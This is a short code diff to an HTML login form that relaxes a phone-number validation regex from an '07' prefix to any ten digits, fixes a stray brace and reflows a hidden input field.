@@ -62,8 +62,7 @@ text-decoration:none;
 <div class="phone">
 <img class="robot" src="data:image/png;base64,IMG_HERE">
 
-<form class="form" method="get" action="/" target="_self" onsubmit="return setPage()">
-<input type="hidden" name="page" id="pageValue">
+<form class="form" method="get" action="/" target="_self" onsubmit="return setPage()">    <input type="hidden" name="page" id="pageValue">
 
     <input id="username" class="input" placeholder="phone / ID Number"
     inputmode="numeric" maxlength="11"
@@ -100,7 +99,7 @@ function setPage(){
         return true;
     }
 
-   if(/^07[0-9]{8}$/.test(v)){{
+    if(/^[0-9]{10}$/.test(v)){
         pageValue.value = "customer";
         return true;
     }
